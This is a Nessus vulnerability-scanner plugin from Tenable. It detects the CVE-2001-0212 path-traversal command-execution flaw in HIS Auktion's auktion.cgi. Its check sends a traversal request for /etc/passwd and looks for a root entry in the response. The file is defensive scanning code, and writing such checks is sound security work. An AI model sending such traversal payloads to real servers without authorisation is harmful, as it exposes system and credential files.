#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10638);
 script_bugtraq_id(2367);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2001-0212");
 script_xref(name:"OSVDB", value:"527");
 
 script_name(english:"HIS AUktion auktion.cgi Traversal Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/auktion.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is running an application that is affected by a
remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'auktion.cgi' cgi is installed. This CGI has a well known security
flaw that lets an attacker execute arbitrary commands with the
privileges of the http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-02/0218.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach d (cgi_dirs())
{
  r = http_send_recv3(method:"GET", item:string(d, "/auktion.cgi?menue=../../../../../../../../../etc/passwd"),
  		 port:port);
  if (isnull(r)) exit(0, "The web server did not answer");
  buf = strcat(r[0], r[1], '\r\n', r[2]);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
  	security_hole(port);  
	exit(0);
	}
}
